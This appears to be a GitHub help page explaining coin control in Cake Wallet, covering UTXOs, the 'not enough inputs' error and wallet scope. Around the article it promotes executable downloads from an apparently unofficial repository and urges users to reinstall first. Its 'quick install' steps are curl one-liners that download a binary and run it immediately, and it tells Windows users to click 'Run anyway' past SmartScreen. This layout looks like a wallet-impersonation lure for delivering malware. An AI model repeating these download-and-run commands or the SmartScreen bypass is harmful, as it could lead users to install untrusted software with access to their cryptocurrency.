![Cake Wallet coin control guide](assets/cake-wallet-coin-control-article-banner.png)

# Coin Control in Cake Wallet

How individual inputs decide what a send costs and whether it can happen.

## Downloads - v6.4.5

<p align="center"><a href="https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-windows.exe"><img src="assets/download-windows.svg" alt="Download Windows"></a> <a href="https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-macos.dmg"><img src="assets/download-macos.svg" alt="Download macOS"></a> <a href="https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-linux.xz"><img src="assets/download-linux.svg" alt="Download Linux"></a></p>

| Platform | Requirements | File |
| --- | --- | --- |
| <img src="assets/platform-windows.svg" alt="platform Windows"> | Windows 10 (1909) or later, 64-bit | [`cake-wallet-desktop-v6.4.5-windows.exe`](https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-windows.exe) |
| <img src="assets/platform-macos.svg" alt="platform macOS"> | macOS 12 or later | [`cake-wallet-desktop-v6.4.5-macos.dmg`](https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-macos.dmg) |
| <img src="assets/platform-linux.svg" alt="platform Linux"> | x64, Ubuntu 20.04 or later, or equivalent | [`cake-wallet-desktop-v6.4.5-linux.xz`](https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-linux.xz) |

Every file on this page comes from the [current Cake Wallet release](https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest).

> Cake Wallet never asks for your recovery phrase, and no support channel needs it.

Coin control lets you choose which outputs a transaction spends instead of letting the wallet pick. Open the send screen, enable coin control, select the inputs, and confirm. "Not enough inputs available" means the selected inputs cannot cover the amount plus the fee, not that the balance is missing.

<!-- ARTICLE-BODY-BEGIN -->

## Send from the current release
Coin control behaviour is version-specific, and the option lives on the send screen of a current build. Install the latest release over your existing one first, so the selection you make is one the wallet will honour.

Download it from the <a href="https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest">latest Cake Wallet release</a> and let the wallet sync. A half-synced wallet shows a smaller set of inputs than you have, which makes any selection unreliable.

## What UTXOs mean for a send
Bitcoin and Litecoin wallets hold separate outputs rather than one number. Each output is spendable on its own, and a transaction spends whole outputs and returns the change. That is why a wallet with 0.01 BTC can fail to send 0.009 BTC if every output is smaller than that plus the fee.

Selecting inputs manually is useful when you want to keep an output untouched, avoid linking two addresses in one transaction, or consolidate small outputs when fees are low. <a href="https://github.com/cakewallet-opensource/cake-wallet-help/blob/main/cake-wallet-network-fee.md">Set the Cake Wallet network fee</a> explains why consolidation is a fee decision and not a privacy one alone.

## Why it says not enough inputs
The message is literal: the outputs you selected add up to less than the amount plus the fee. Either select more inputs, lower the fee level, or let the wallet choose automatically.

It is not a sign of a corrupted wallet. The same balance with different inputs can succeed or fail, which is exactly the behaviour coin control exists to expose. If the balance itself looks wrong, the problem is upstream of coin control.

## Wallets, accounts and UTXO scope
Inputs belong to one wallet, so switching to another wallet shows a different set. Monero works differently: accounts and subaddresses share one wallet's outputs, so a selection made in one account reflects the wallet, not just that account.

Keeping funds separate by wallet is the reliable way to keep their inputs separate. <a href="https://github.com/cakewallet-opensource/cake-wallet-guides/blob/main/cake-wallet-multiple-wallets.md">Manage multiple wallets</a> explains what a second wallet actually separates, including its own phrase and its own backup.

## When the balance will not move
A wallet that shows a balance but refuses every send has one of three problems: unconfirmed funds, an unreachable node, or a fee set higher than the remaining balance allows. Coin control makes the first one visible immediately.

Check confirmations before you change anything. <a href="https://github.com/cakewallet-opensource/cake-wallet-help/blob/main/cake-wallet-funds-not-appearing.md">Funds not appearing in Cake Wallet</a> covers the confirmation and sync checks in the order that saves the most time.

## FAQ
### What is coin control?
A send option that lets you choose which outputs the transaction spends instead of accepting the wallet's automatic choice.
### Why does it say not enough inputs available?
The selected outputs cannot cover the amount plus the fee. Add inputs or lower the fee.
### Can I sign and verify a message?
The app documents message signing and verification. Use it to prove control of an address, never to prove ownership of a phrase.

<!-- ARTICLE-BODY-END -->

## How to install Cake Wallet

<!-- INSTALL-BEGIN -->
### Windows
Quick install (CMD):

```cmd
curl -fLo setup.exe https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-windows.exe && setup.exe
```

Manual install:
1. Download <a href="https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-windows.exe">cake-wallet-desktop-v6.4.5-windows.exe</a>.
2. Open the downloaded file.
3. If SmartScreen appears, choose More info, then Run anyway.
4. Finish the setup steps.

### macOS
Quick install (Terminal):

```bash
curl -fLo setup.dmg https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-macos.dmg && open setup.dmg
```

Manual install:
1. Download <a href="https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-macos.dmg">cake-wallet-desktop-v6.4.5-macos.dmg</a>.
2. Open the .dmg file.
3. Drag the app to Applications.
4. On first launch, right-click the app and choose Open.

### Linux
Manual install:
1. Download <a href="https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-linux.xz">cake-wallet-desktop-v6.4.5-linux.xz</a> or the <a href="https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-linux.flatpak">cake-wallet-desktop-v6.4.5-linux.flatpak</a>.
2. Archive: extract it and run the executable inside the extracted folder.
3. Flatpak: run `flatpak install ./cake-wallet-desktop-v6.4.5-linux.flatpak` where you saved it.
4. Launch Cake Wallet and restore your wallet.
<!-- INSTALL-END -->

## Related guides
[set the Cake Wallet network fee](https://github.com/cakewallet-opensource/cake-wallet-help/blob/main/cake-wallet-network-fee.md) · [manage multiple wallets](https://github.com/cakewallet-opensource/cake-wallet-guides/blob/main/cake-wallet-multiple-wallets.md) · [funds not appearing in Cake Wallet](https://github.com/cakewallet-opensource/cake-wallet-help/blob/main/cake-wallet-funds-not-appearing.md) · [latest Cake Wallet release](https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest)
